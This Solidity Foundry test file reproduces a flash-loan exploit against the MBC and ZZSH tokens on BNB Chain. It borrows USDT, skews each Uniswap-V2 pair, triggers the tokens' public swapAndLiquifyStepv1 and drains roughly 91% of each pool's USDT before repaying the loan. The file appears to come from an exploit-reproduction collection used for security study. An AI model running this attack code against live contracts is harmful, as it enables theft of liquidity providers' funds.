// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";

import {IUniswapV2Pair} from "../../utils/IUniswapV2Pair.sol";


interface IDppOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address _assetTo, bytes memory data) external;
}

interface ILiqToken is IERC20 {
    function swapAndLiquifyStepv1() external;
}

contract Exploit_MBCToken is TestHarness, TokenBalanceTracker {
    IDppOracle internal dppOracle = IDppOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    
    IERC20 internal usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    ILiqToken internal mbc = ILiqToken(0x4E87880A72f6896E7e0a635A5838fFc89b13bd17);
    ILiqToken internal zzsh = ILiqToken(0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6);

    ILiqToken[] internal liqTokens = [mbc, zzsh];

    IUniswapV2Pair internal pairUsdtMbc = IUniswapV2Pair(0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1);
    IUniswapV2Pair internal pairUsdtZzsh = IUniswapV2Pair(0x33CCA0E0CFf617a2aef1397113E779E42a06a74A);

    IUniswapV2Pair[] internal pairs = [pairUsdtMbc, pairUsdtZzsh];

    function setUp() external{
        cheat.createSelectFork('bsc', 23474460);
        cheat.deal(address(this), 0);

        addTokenToTracker(address(usdt));
        addTokenToTracker(address(mbc));
        addTokenToTracker(address(zzsh));

        updateBalanceTracker(address(this));
        updateBalanceTracker(address(pairUsdtZzsh));
        updateBalanceTracker(address(pairUsdtMbc));
        updateBalanceTracker(address(mbc));
        updateBalanceTracker(address(zzsh));
    }

    function test_attack() external  {
        console.log('===== STEP 1: REQUEST FLASHLOAN =====');
        logBalancesWithLabel('Attacker Contract', address(this));
        uint256 balanceUsdtBefore = usdt.balanceOf(address(this));
        uint256 balanceMBCBefore = mbc.balanceOf(address(this));
        uint256 balanceZZSHBefore = zzsh.balanceOf(address(this));

        dppOracle.flashLoan(0, usdt.balanceOf(address(dppOracle)), address(this), hex'30');

        uint256 balanceUsdtAfter = usdt.balanceOf(address(this));
        uint256 balanceMBCAfter = mbc.balanceOf(address(this));
        uint256 balanceZZSHAfter = zzsh.balanceOf(address(this));

        assertGe(balanceUsdtAfter, balanceUsdtBefore);
        assertGe(balanceZZSHAfter, balanceZZSHBefore);
        assertGe(balanceMBCAfter, balanceMBCBefore);
    }

    function DPPFlashLoanCall(address sender, uint256 amount1, uint256 amount2, bytes memory ) external {
        require(msg.sender == address(dppOracle), 'Only oracle');
        require(sender == address(this), 'Only requested by this');

        uint256 usdtReceived = amount1 > 0 ? amount1 : amount2;

        console.log('===== STEP 2: FLASHLOAN RECEIVED =====');
        logBalancesWithLabel('Attacker Contract', address(this));
        
        console.log('===== STEP 3: START MANIPULATION =====');
        uint256 lenTokens = liqTokens.length;
        for(uint256 i = 0; i< lenTokens; i++){
            IUniswapV2Pair curPair = pairs[i];
            ILiqToken curLiqToken = liqTokens[i];

            // Pay the Uniswap Pool.
            // A note for those not-familiar, the swap in uniswap expects
            // a transfer to it _before_ and does not use permit/allowance
            // https://docs.uniswap.org/contracts/v2/concepts/core-concepts/swaps
            usdt.transfer(address(curPair), 150000 ether);

            // For the first part, we drain MBC tokens
            (uint112 reserve0, uint112 reserve1, ) = curPair.getReserves();

            if(i == 0) {
                console.log('===== MBC SWAP =====');
                curPair.swap(reserve0 * 930 / 1000, 0, address(this), '');
            }

            if(i == 1) {
                console.log('===== ZZSH SWAP =====');
                curPair.swap(0, reserve1 * 918 / 1000, address(this), '');
            }

            logBalancesWithLabel('Attacker Contract', address(this));
            logBalancesWithLabel(curLiqToken.name(), address(curLiqToken));
            logBalancesWithLabel('Current Pair', address(curPair));
            
            console.log('===== LIQ TOKEN SWAP AND LIQUIFY =====');
            curLiqToken.swapAndLiquifyStepv1();

            logBalancesWithLabel('Attacker Contract', address(this));
            logBalancesWithLabel(curLiqToken.name(), address(curLiqToken));
            logBalancesWithLabel('Current Pair', address(curPair));

            curPair.sync();

            console.log('===== TRANSFER USDT and LIQ TOKEN TO PAIR =====');
            usdt.transfer(address(curPair), 1001);
            curLiqToken.transfer(address(curPair), curLiqToken.balanceOf(address(this)));
            logBalancesWithLabel('Attacker Contract', address(this));
            logBalancesWithLabel(curLiqToken.name(), address(curLiqToken));
            logBalancesWithLabel('Current Pair', address(curPair));

            console.log('===== DRAIN PAIR =====');
            uint256 amountToDrain;

            if(i == 0) {
                amountToDrain = usdt.balanceOf(address(curPair)) * 912 / 1000; // ninedec
                curPair.swap(0, amountToDrain, address(this), '');
            }

            if(i == 1) {
                amountToDrain = usdt.balanceOf(address(curPair)) * 910 / 1000;
                curPair.swap(amountToDrain, 0, address(this), '');
            }

            logBalancesWithLabel('Attacker Contract', address(this));
            logBalancesWithLabel(curLiqToken.name(), address(curLiqToken));
            logBalancesWithLabel('Current Pair', address(curPair));
        }
        console.log('===== REPAYING LOAN =====');
        require(usdt.transfer(address(dppOracle), usdtReceived));
        logBalancesWithLabel('Attacker Contract', address(this));       
    }
}
